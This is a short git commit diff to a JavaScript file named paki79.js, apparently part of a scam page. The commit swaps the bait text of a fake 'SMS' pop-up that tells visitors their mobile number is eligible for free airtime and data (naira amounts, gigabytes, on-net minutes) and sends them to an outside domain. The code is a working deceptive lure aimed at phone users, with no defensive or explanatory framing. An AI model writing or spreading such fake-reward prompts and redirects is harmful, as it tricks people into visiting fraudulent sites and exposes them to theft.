627bea87e8a8299784e84fd425e421426fffd409
doctorschoolz <toners-faerie3k@icloud.com>
2026-08-09 09:10:45 +0100

    Update paki79.js

--- paki79.js
+++ paki79.js
@@ -1,5 +1,5 @@
-    var password = '₦5,000 Airtime + 25GB Data'
-password=prompt('SMS: Congratulations, your Mobile Number is eligible to receive  ₦5,000 Airtime + 25GB Data, click OK to Activate now','₦5,000 Airtime + 25GB Data');
-if (password != '₦5,000 Airtime + 25GB Data') {
+    var password = '50GB + 5,000 On-net Mins'
+password=prompt('SMS: Congratulations, your Mobile Number is eligible to receive  50GB + 5,000 On-net Mins, click OK to Activate now','50GB + 5,000 On-net Mins');
+if (password != '50GB + 5,000 On-net Mins') {
 location.href='https://www.bhprylarzc.online/paki-50gb';
 }
